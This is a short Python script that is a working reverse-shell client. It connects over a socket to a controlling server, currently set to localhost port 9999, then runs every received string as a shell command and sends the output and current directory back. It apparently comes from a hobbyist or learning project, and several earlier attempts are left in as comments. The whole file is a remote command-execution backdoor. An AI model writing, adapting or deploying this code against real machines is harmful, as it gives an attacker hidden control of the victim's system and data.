import os
import socket
import subprocess

c=socket.socket()
c.connect(("localhost",9999))

while True:
    data=c.recv(1024)
    if (data[:2].decode("utf-8") =="cd"):
#cd command works differently as it doesnt send any data  back to server....... 
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_bytes=cmd.stdout.read()+cmd.stderr.read()
        output_string=str(output_bytes,"utf-8")
        # output_string=str(cmd)
        # out=str(data.decode('utf-8'))
        # output_string=subprocess.check_call(out,shell=True)

        c.send(str.encode(output_string + str(os.getcwd())+'> '))
        # c.send(bytes(output_string,'utf-8'))

c.close()
